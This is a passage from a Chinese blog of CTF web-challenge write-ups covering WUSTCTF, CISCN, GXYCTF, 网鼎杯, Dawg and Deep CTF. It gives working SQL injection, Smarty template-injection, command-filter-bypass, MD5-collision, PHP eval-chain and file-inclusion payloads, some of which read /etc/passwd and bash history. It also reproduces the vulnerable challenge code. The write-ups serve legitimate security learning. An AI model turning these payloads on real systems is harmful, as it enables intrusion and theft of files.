flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;s1mple_php_1s_v3ry_e@sy_and_here_1s_y0ur_stupid_flag_wish_u_h@ve_@_go0d_time_enj0y_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p>朴实无华的界面又报了两个错，不过依旧没什么用。回过头来看查询，那应该是数据库操作了。稍微试了一手之后发现是 GET 参数与输入框的对应，猜测一波查询语句可能是 <code>SELECT SCORE FROM TABLE WHERE ID=</code>，于是尝试布尔盲注，构造一波 <code>if((ascii(substr((select(database())),1,1))&lt;1),1,0)</code> 检测发现大于 1 和小于 1 的时候分别对应 <code>Hi admin, your score is: 100</code> 和 <code>student number not exists.</code>。于是拿出之前的二分法模板，稍作修改就可以用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆列</span><br><span class="line">if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),1,1))&gt;1),1,0)</span><br><span class="line"></span><br><span class="line">爆 flag</span><br><span class="line">if((ascii(substr((select(value)from(flag)),1,1))&gt;1),1,0)</span><br></pre></td></tr></table></figure><p>这里又出现了常规操作，真的 flag 不在 flag 里反而在 value 里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>这题上来给了俩接口，暗示 X-Forwarded-For，然后当前 IP 会在页面上显示，于是想到了模板注入，试了一手之后发现真的是，而且是 Smarty。一番查找之后找到了<a href="https://www.smarty.net/docs/zh_CN/language.function.if.tpl">参考</a>。于是果断构造 <code>&#123;if print_r(file_get_contents('/flag'))&#125;&#123;/if&#125;</code>，放到 X-Forwarded-For 的位置请求。之后在页面源码中可以找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;291d99ce-2668-4b27-bc1a-da2c4aa567e2&#125;</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">FileInclusion</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">fastcoll</span></p><p>题目的页面一打开就显示了两张图，很不一样的是有一张是 Base64 嵌入在网页里的，这种做法一般比较少。于是看了一眼 url，发现有两个参数，其中的 <code>img</code> 给的很像是 Base64 编码。于是尝试补全等号然后解码，发现更像了，于是再解密了一次，得到了 <code>3535352e706e67</code>。看起来像 hex，尝试解码后果然得到了线索 <code>555.png</code>。于是便想到包含文件。把 <code>index.php</code> 一顿操作之后得到了页面源码（这里截取 php 部分）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>观察到可以执行的点是参数 <code>cmd</code>，但是正则过滤十分苛刻。这里有一个点，对于 php 来说，正则需要使用 <code>\\\</code> 来匹配才能匹配到反斜杠，所以实际上反斜杠还能用。在一番查找下，我找到了另外一个可以用的指令 <code>sort</code>。于是这部分就有了两种解决方法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fla\g</span><br><span class="line">sort /flag</span><br></pre></td></tr></table></figure><p>剩下的就是 MD5 碰撞的问题。一番查找之下，我找到了一个生成 MD5 碰撞字符串的工具。生成好之后把字符串分别 urlencode 之后组合成 POST 参数，使用 Burpsuite 发送请求（HackBar 依旧没有成功）。有一个比较神奇的点是，我在把 POST 请求最后的换行符去掉之后才请求成功的。有可能是这个原因导致使用 HackBar 无法成功得到 flag。</p><p>这里贴上我使用的两个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%91r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%1E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%8A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5DHd%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%0C%1B%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AE%D0%A6%09Q%2B&amp;b&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%11r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%9E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%0A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5D%C8d%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%8C%1A%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AEP%A6%09Q%2B</span><br></pre></td></tr></table></figure><p>准确无误地发送封包之后可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f9dccbe4-f6d1-4928-9904-fc1e1d39944d&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Session</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span></p><p>题目开始就只有一句话，Header 和 Cookie 也没得线索，于是果断扫目录，发现 <code>/.git</code> 响应长度不一样。于是果断上 GitHack 拿到了首页源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>啊，看这正则过滤，多么美妙，真实的一个参数都不给你。不过不慌，我可是搜过半小时相关知识点的萌新。先构造个 <code>scandir(current(localeconv()))</code> 看一下根目录有啥。这里的原理就是 <code>localeconv()</code> 输出的数组中第一个一定是一个 <code>.</code>。根据结果发现 flag.php 在根目录。于是就得想办法读取它啦，但是它不在数组的第一个，有两种办法来读到它。把数组反过来然后整个 <code>next()</code>，也就是  <code>highlight_file(next(array_reverse(scandir(pos(localeconv())))))</code>。或者简单粗暴，整个 flip 和 rand <code>readfile(array_rand(array_flip(scandir(current(localeconv())))))</code> 不停地刷新，就能刷到啦。</p><p>我还查到了一种神奇的做法，利用 session 来完成。首先在 Console 里面执行 <code>document.cookie=&quot;PHPSESSID=flag.php&quot;</code> 指定 SessionId。然后 exp 写 <code>show_source(session_id(session_start()));</code> 就能成功读到 flag.php 从而拿到 flag 了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5f914f8d-550d-4c3a-bdae-345f50997b0d&#125;</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">githacker</span></p><p>这题是事先就被透露了是 git 源码泄露的，其实还有个要点，Console 里说没有 commit，这点很重要。调整 git 的 HEAD 才能拿到完整的源码，使用到的工具是 <a href="https://github.com/wangyihang/githacker">githacker</a>。恢复源码之后可以拿到 write_do.php。仔细读一读，不难发现，修改的时候 <code> $category = mysql_fetch_array($result)[&#39;category&#39;];</code>，这里的变量 <code>$category</code> 会被直接传入 SQL 语句中。所以只要想办法使 <code>content</code> 变成我们想要的数据就行了。所以，可以使 <code>category</code> 为 <code>&#39;,content=payload/*</code> 然后提交之后再修改 <code>content</code> 使其为 <code>*/#</code> 闭合一个注释然后把后面的语句都注释掉，这个时候，语句变化了，这样就能使 <code>content</code> 输出我们需要的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=payload/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="string">&quot;insert into comment set category = &#x27;&#x27;,content=payload/**/#&quot;</span></span><br></pre></td></tr></table></figure><p>一开始我是想直接找到用户密码的，尝试读取 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 未果之后，我又长了新知识。根据 <code>/etc/passwd</code> 下的提示 ，www 用户可以使用 bash，于是查询该用户的 <code>.bash_history</code> 找到了线索，读取 <code>/tmp/html/.DS_Store</code>。这里还有个要点，因为文件太长了，使用 <code>load_file()</code> 读取的时候可能显示不完整，所以就用 <code>hex()</code> 转换一下，构造 <code>&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>，解码之后找到了线索 <code>flag_ 8946e1ff1ee3e40f.php</code>。按照一样的套路读取这个文件可以读取到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd19c68-e4eb-43d7-845a-7a51bce22828&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>日常赛事解题记</title>
      <link href="/zh-CN/posts/24a48841.html"/>
      <url>/zh-CN/posts/24a48841.html</url>
      
        <content type="html"><![CDATA[<p>最近零零散散在各种从各种渠道参加的赛事上写了些水题，一直在纠结到底要不要记。不过既然都做了，感觉过程中也有不少骚操作，就稍微记一记。正好也记上这些比赛里没写出来的题目的复现。</p><p><escape><span id="more"></span></escape></p><hr><div style="pointer-events: none"><h2 style="display:none" id="Dawg-CTF-2020">Dawg CTF 2020</h2><img src="https://ae01.alicdn.com/kf/H24a98f5da04f45e2887a01b5e0d640eff.png"/></div><h3 id="Free-WIFI-Part-1"><a href="#Free-WIFI-Part-1" class="headerlink" title="Free WIFI Part 1"></a>Free WIFI Part 1</h3><p>附件给了个 free-wifi.pcapng，导入到 WireShark 里略微分析，可以发现一个请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    [Full request URI: http:&#x2F;&#x2F;freewifi.ctf.umbccd.io&#x2F;staff.html]</span><br><span class="line">    [HTTP request 1&#x2F;1]</span><br><span class="line">    [Response in frame: 89]</span><br><span class="line">    File Data: 134 bytes</span><br><span class="line">HTML Form URL Encoded: application&#x2F;x-www-form-urlencoded</span><br><span class="line">    Form item: &quot;csrf_token&quot; &#x3D; &quot;ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4DYg.fnXZhEmbQPzEgFWLgEfjSTeqX2Y&quot;</span><br><span class="line">    Form item: &quot;passcode&quot; &#x3D; &quot;5004f47a&quot;</span><br><span class="line">    Form item: &quot;submit&quot; &#x3D; &quot;Submit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试访问 staff.html，并根据上述请求构造一个 POST 请求，就能在页面底端拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;w31c0m3_tO_d@wgs3c_!nt3rn@t!0n@1&#125;</span><br></pre></td></tr></table></figure><h3 id="The-Lady-is-a-Smuggler"><a href="#The-Lady-is-a-Smuggler" class="headerlink" title="The Lady is a Smuggler"></a>The Lady is a Smuggler</h3><p>这题一开始给了个页面，下面有一段加密，但其实解密那段得出来的 flag 是无效的。真实的 flag 在页面的源码中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_ElizebethSmith&#125;</span><br></pre></td></tr></table></figure><h3 id="Tracking"><a href="#Tracking" class="headerlink" title="Tracking"></a>Tracking</h3><p>这题页面感觉跟前面那个一样，首先看一手源码。找到一段 JavaScript。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">68</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">103</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">114</span>, <span class="number">69</span>,<span class="number">100</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">125</span>))</span><br></pre></td></tr></table></figure><p>放到 Console 里面运行就得到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_uni&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="Deep-CTF">Deep CTF</h2><img src="https://ae01.alicdn.com/kf/H9f57bc3eb2ec46d9af14db462b6d4a94p.png"/></div><h3 id="Oh-JS"><a href="#Oh-JS" class="headerlink" title="Oh JS!"></a>Oh JS!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p><p>这题开门见山地给了个登录的 form，但其实查看页面源代码可以看到一段 JSFuck，把它掐头去尾放到 Console 跑一下可以发现线索。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.forms[<span class="number">0</span>].username.value == <span class="string">&quot;corb3nik&quot;</span> &amp;&amp; <span class="built_in">document</span>.forms[<span class="number">0</span>].password.value == <span class="string">&quot;chickenachos&quot;</span>) <span class="built_in">document</span>.location = <span class="string">&quot;4d4932602a75414640946d38ea6fefbf.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是直接跳过登录的步骤，访问 <code>.../4d4932602a75414640946d38ea6fefbf.php</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;g0tta_kn0w_y0ur_J4v4Scr1pt&#125;</span><br></pre></td></tr></table></figure><h3 id="Magic-Word"><a href="#Magic-Word" class="headerlink" title="Magic Word!"></a>Magic Word!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span></p><p>这题给出了页面的源代码和 <code>Try to reach get_mad_and_give_flag()</code> 的提示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$what_he_said</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>];</span><br><span class="line">    <span class="variable">$what_you_dont_want_to_hear</span> = <span class="string">&#x27;d33p&#x27;</span>;</span><br><span class="line">    <span class="variable">$what_you_actually_heard</span> = preg_replace(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$what_you_dont_want_to_hear</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$what_he_said</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$what_you_actually_heard</span> === <span class="variable">$what_you_dont_want_to_hear</span>) &#123;</span><br><span class="line">      get_mad_and_give_flag();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>既然是 <code>preg_replace()</code>，之前在 SQL 注入的题目里面遇到过，只需要夹着写一遍就行了。于是构造 <code>?magic_word=d3d33p3p</code> 得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;d33p_p33d&#125;</span><br></pre></td></tr></table></figure><h3 id="Nothing-is-Impossible"><a href="#Nothing-is-Impossible" class="headerlink" title="Nothing is Impossible"></a>Nothing is Impossible</h3><p>这题给的是一个可以执行 php 代码的框，于是果断试了一手 <code>system()</code>，发现仍然可以使用。根据题目提示，flag 在 <code>/tmp/flag.php</code>。于是直接使用 <code>od</code> 构造了 <code>system(&quot;od -A d -c /tmp/flag.php&quot;)</code>，得到结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000 &lt; ? p h p \n e c h o &quot; d 3 3 p 0000016 &#123; f 4 s t _ C G 1 _ S S R F _ p 0000032 0 w 3 r ! ! &#125; &quot; ; \n 0000042</span><br></pre></td></tr></table></figure><p>整理之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;f4st_CG1_SSRF_p0w3r!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Did-You-Got-Trolled"><a href="#Did-You-Got-Trolled" class="headerlink" title="Did You Got Trolled?"></a>Did You Got Trolled?</h3><p>这题我成功地被绕了进去，他给了好多动物的叫声，我还以为是动物园。还有那个假装可以注入的地方，也是很好笑。其实真正的要点在找到两个 key。在学长的提示下，我在 <code>.../css/clean-blog.css</code> 下找到了 Key1。其实他是有给提示的，只有那一个页面引入了同样的两份 CSS，且重复的那份是没有压缩的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line"> * What is this doing here?</span><br><span class="line"> * Key1 &#x3D; gimme0x038792</span><br><span class="line"> * </span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>接下来的那一份就得扫目录了，是在 <code>.../robots.txt</code> 里面有个提示，写着 <code>Disallow /deep.php</code>。访问这个页面可以得到一个提示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAINTENANCE</span><br><span class="line">loading...</span><br><span class="line">deep.php?page&#x3D;debug.html</span><br></pre></td></tr></table></figure><p>很容易知道这是一个文件包含，然后再看一手页面源码，可以找到 <code>&lt;!--Creds in /home/ubuntu/key2.txt --&gt;</code> 的注释。于是构造 <code>?page=/home/ubuntu/key2.txt</code> 得到 